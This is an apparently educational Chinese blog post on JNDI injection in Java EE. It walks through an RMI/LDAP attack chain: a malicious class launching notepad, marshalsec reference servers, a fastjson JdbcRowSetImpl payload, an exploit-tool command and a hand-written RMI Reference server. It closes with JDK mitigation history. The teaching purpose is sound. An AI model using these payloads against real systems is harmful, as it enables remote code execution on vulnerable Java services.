---
title: JavaEE应用&JNDI注入&RMI服务&LDAP服务&DNS服务&高版本限制绕过
published: 2026-03-16 12:00:00
description: JNDI注入漏洞解析，涵盖了RMI、LDAP、DNS等协议的原理、利用方式，通过实际项目演示了从恶意类编译、协议服务搭建到客户端触发漏洞的完整攻击链。
tags: [Web开发,JavaEE]
category: 网络安全
draft: false
---

# 知识点

1. 安全开发-JavaEE-JNDI注入-LADP&RMI&DNS等
2. 安全开发-JavaEE-JNDI注入-项目工具&手工原理等

| **协议** | **作用**                                                     |
| -------- | ------------------------------------------------------------ |
| LDAP     | 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容 |
| RMI      | JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象 |
| DNS      | 域名服务                                                     |
| CORBA    | 公共对象请求代理体系结构                                     |

思考明白：

什么是jndi注入

为什么有jndi注入

JDNI注入安全问题

JDNI注入利用条件

参考：https://blog.csdn.net/dupei/article/details/120534024

# JNDI注入-RMI&LDAP服务

JNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。

RMI：远程方法调用注册表

LDAP：轻量级目录访问协议

## 调用检索

Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()

在RMI服务中调用了InitialContext.lookup()的类有：

```
org.springframework.transaction.jta.JtaTransactionManager.readObject()

com.sun.rowset.JdbcRowSetImpl.execute()

javax.management.remote.rmi.RMIConnector.connect()

org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
```

在LDAP服务中调用了InitialContext.lookup()的类有：

```
InitialDirContext.lookup()

Spring LdapTemplate.lookup()

LdapTemplate.lookupContext()
```

## 本身源码中的JDNI注入触发代码

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDITest {
    public static void main(String[] args) throws NamingException {
        InitialContext ic = new InitialContext();
        ic.lookup("rmi://101.42.233.155:1099/2fgvzj");
        // 同样还有ldap和dns
        // ic.lookup("ldap://xxx/xxx");
        // ic.lookup("dns://xxxxx.xxx.xx.xxx");
    }
}
```

## 来源于JDK或jar包的JNDI注入触发代码

```java
import com.alibaba.fastjson.JSON;

public class FastJsonSer {
    public static void main(String[] args) {
        System.setProperty("java.util.Arrays.useLegacyMergeSort", "true");

        // 如fastjson反序列化链：com.sun.rowset.JdbcRowSetImpl.connect dataSourceName
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"rmi://xx.xx.xx.xx/xxxx\", " +
                "\"autoCommit\":true" +
                "}";
        JSON.parse(payload);
    }
}
```

## 审计

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Method;

public class JNDITest {
    public static void main(String[] args) throws NamingException, ClassNotFoundException, NoSuchMethodException {
        // 安全角度：审计 看这个反射类调用的逻辑
        Class<?> aClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
//        for (Method m : aClass.getDeclaredMethods()) {
//            System.out.println(m.getName());
//        }
        Method declaredMethod = aClass.getDeclaredMethod("setDataSourceName", String.class);
        System.out.println(declaredMethod);
    }
}
```

# JNDI注入

## 项目1

项目1：https://github.com/mbechler/marshalsec

### 编译调用对象

javac Note.java

```java
import java.io.IOException;

public class Note {
    public Note() throws IOException {
        Runtime.getRuntime().exec("notepad");
    }
}
```

在终端进行编译

```
javac .\Note.java
```

### 使用利用工具生成调用协议（rmi,ldap）

使用python启动web服务

```
python -m http.server 端口
```

执行

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:端口/#Note

java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:端口/#/#Note
```

### 将生成的Class存放访问路径

在命令行（ldap）

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:端口/#Note
```

代码中：

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class JNDITest {
    public static void main(String[] args) throws NamingException {
        InitialContext ic = new InitialContext();
        ic.lookup("ldap://127.0.0.1:1389/Note");
    }
}

```

 ![image-20260316103727650](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316103727650.png)

最后的结果就是这样的，其实演示目的就是为了了解，JNDI客户端在解析恶意的LDAP地址时，会从远程HTTP服务器下载并执行恶意类，导致代码执行。

- `Note` 是 LDAP 服务器返回的 Reference 中指定的类名
- 这个类名告诉 JNDI 客户端："你要找的 Note 类，需要从我的 HTTP 服务器上下载"
- 真正执行的代码是下载回来的 `Note.class` 文件中的内容

## 项目2

项目2：https://github.com/welk1n/JNDI-Injection-Exploit

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A xx.xx.xx.xx

上次文章末尾有做过演示。

## JNDI注入-手工

JNDI注入-手工：

```
//bind：将名称绑定到对象中；

//lookup：通过名字检索执行的对象；

//Reference类表示对存在于命名/目录系统以外的对象的引用。

//Reference参数：

//className：远程加载时所使用的类名；

//classFactory：加载的class中需要实例化类的名称；

//classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；
```

###  Server注册监听

```java
// 端口
Registry registry = LocateRegistry.createRegistry(7778);

// class名 方法名 监听端口
// 使用python本地启动web服务指定端口8089监听
Reference reference = new Reference("calc", "calc", "http://127.0.0.1:8089/");

ReferenceWrapper wrapper = new ReferenceWrapper(reference);

// 执行名为RCE
registry.bind("RCE", wrapper);
```

## Clinet连接触发

```java
String uri = "rmi://127.0.0.1:7778/RCE";

InitialContext initialContext = new InitialContext();

initialContext.lookup(uri);
```

# JDK高版本注入绕过

图片仅供参考：

![image-20260316110152305](https://cdn.jsdelivr.net/gh/pwn022/0x00/NetSecurity/img/image-20260316110152305.png)

JDK 6u45、7u21之后：

```
java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加RMI ClassLoader安全性。
```

JDK 6u141、7u131、8u121之后：

```
增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
```

JDK 6u211、7u201、8u191之后：

```
增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。
```

高版本绕过：

见后续Java安全篇章课程将讲到